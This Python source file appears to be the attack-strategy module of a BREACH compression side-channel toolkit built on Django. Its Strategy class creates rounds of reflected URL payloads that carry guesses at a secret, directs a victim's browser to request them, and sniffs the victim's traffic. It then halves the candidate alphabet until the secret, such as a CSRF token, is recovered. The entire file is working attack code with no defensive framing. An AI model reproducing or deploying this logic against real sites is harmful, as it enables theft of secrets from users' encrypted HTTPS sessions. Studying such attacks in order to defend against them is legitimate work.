from django.utils import timezone
from django.db.models import Max

from breach.analyzer import decide_next_world_state
from breach.models import SampleSet, Round
from breach.sniffer import Sniffer


SAMPLES_PER_SAMPLESET = 100


class Strategy(object):
    def __init__(self, victim):
        self._victim = victim
        self._sniffer = Sniffer(victim.snifferendpoint)

        # Extract maximum round index for the current victim.
        current_round_index = Round.objects.filter(victim=self._victim).aggregate(Max('index'))['index__max']

        if not current_round_index:
            current_round_index = 1
            self._analyzed = True
            self.begin_attack()

        self._round = Round.objects.filter(victim=self._victim, index=current_round_index)[0]
        self._analyzed = False

    def _build_candidates(self, state):
        '''Given a state of the world, produce a list of candidate alphabets.'''

        candidate_alphabet_cardinality = len(state['knownalphabet']) / 2

        bottom_half = state['knownalphabet'][:candidate_alphabet_cardinality]
        top_half = state['knownalphabet'][candidate_alphabet_cardinality:]

        return [bottom_half, top_half]

    def _get_first_round_state(self):
        return {
            'knownsecret': self._victim.target.prefix,
            'candidatealphabet': self._victim.target.alphabet,
            'knownalphabet': self._victim.target.alphabet
        }

    def _get_unstarted_samplesets(self):
        return SampleSet.objects.filter(
            round=self._round,
            started=None
        )

    def _reflection(self, sampleset):
        # We use '^' as a separator symbol and we assume it is not part of the
        # secret. We also assume it will not be in the content.

        sentinel = '^'

        assert(sentinel not in self._victim.target.alphabet)

        huffman_complement = set(self._victim.target.alphabet) - set(sampleset.candidatealphabet)

        candidate_secrets = set()

        for letter in sampleset.candidatealphabet:
            candidate_secret = self._round.knownsecret + letter
            candidate_secrets.add(candidate_secret)

        reflected_data = [
            '',
            sentinel.join(candidate_secrets),
            sentinel.join(huffman_complement),
            ''
        ]

        reflection = sentinel.join(reflected_data)

        return reflection

    def _sampleset_to_work(self, sampleset):
        return {
            'url': self._victim.target.endpoint % self._reflection(sampleset),
            'amount': SAMPLES_PER_SAMPLESET,
            'timeout': 0
        }

    def get_work(self):
        '''Produces work for the victim.

        Pre-condition: There is already work to do.'''

        self._sniffer.start(self._victim.sourceip, self._victim.target.host)

        unstarted_samplesets = self._get_unstarted_samplesets()

        assert(unstarted_samplesets)

        sampleset = unstarted_samplesets[0]
        sampleset.started = timezone.now()
        sampleset.save()

        return self._sampleset_to_work(sampleset)

    def _get_current_sampleset(self):
        started_samplesets = SampleSet.objects.filter(round=self._round).exclude(started=None)

        assert(len(started_samplesets) == 1)

        sampleset = started_samplesets[0]

        return sampleset

    def _mark_current_work_completed(self):
        sampleset = self._get_current_sampleset()
        sampleset.completed = timezone.now()
        sampleset.success = True
        sampleset.save()

    def _collect_capture(self):
        captured_data = self._sniffer.read(self._victim.sourceip, self._victim.target.host)
        return captured_data

    def _analyze_current_round(self):
        '''Analyzes the current round samplesets to extract a decision.'''

        current_round_samplesets = SampleSet.objects.filter(round=self._round)
        self._decision = decide_next_world_state(current_round_samplesets)
        self._analyzed = True

    def _round_is_completed(self):
        '''Checks if current round is completed.'''

        assert(self._analyzed)

        # Do we need to collect more samplesets to build up confidence?
        return self._decision['confidence'] > 1

    def _create_next_round(self):
        assert(self._round_is_completed())

        self._create_round(self._decision['state'])

    def _create_round(self, state):
        '''Creates a new round based on the analysis of the current round.'''

        assert(self._analyzed)

        candidate_alphabets = self._build_candidates(state)

        # This next round could potentially be the final round.
        # A final round has the complete secret stored in knownsecret.
        next_round = Round(
            victim=self._victim,
            index=self._round.index + 1 if hasattr(self, '_round') else 1,
            roundcardinality=max(map(len, candidate_alphabets)),
            amount=SAMPLES_PER_SAMPLESET,
            knownalphabet=state['knownalphabet'],
            knownsecret=state['knownsecret']
        )
        next_round.save()

        self._round = next_round

    def _create_round_samplesets(self):
        state = {
            'knownalphabet': self._round.knownalphabet,
            'knownsecret': self._round.knownsecret
        }

        candidate_alphabets = self._build_candidates(state)

        a = SampleSet(
            round=self._round,
            candidatealphabet=candidate_alphabets[0]
        )
        a.save()

        b = SampleSet(
            round=self._round,
            candidatealphabet=candidate_alphabets[1]
        )
        b.save()

    def _attack_is_completed(self):
        return len(self._round.knownsecret) == self._victim.target.secretlength

    def work_completed(self):
        '''Receives and consumes work completed from the victim, analyzes
        the work, and returns True if the attack is complete (victory),
        otherwise returns False if more work is needed.

        It also creates the new work that is needed.

        Post-condition: Either the attack is completed, or there is work to
        do (there are unstarted samplesets in the database).'''

        # Call sniffer to get captured data
        capture = self._collect_capture()
        self._mark_current_work_completed()

        round_samplesets = SampleSet.objects.filter(round=self._round)
        unstarted_samplesets = round_samplesets.filter(started=None)

        if unstarted_samplesets:
            # Batch is not yet complete, we need to collect more samplesets
            # that have already been created for this batch.
            return False

        # All batches are completed.
        self._analyze_current_round()

        if self._round_is_completed():
            # Advance to the next round.
            self._create_next_round()

            if self._attack_is_completed():
                return True

        # Not enough confidence, we need to create more samplesets to be
        # collected for this round.
        self._create_round_samplesets()

        return False

    def begin_attack(self):
        self._create_round(self._get_first_round_state())
        self._create_round_samplesets()
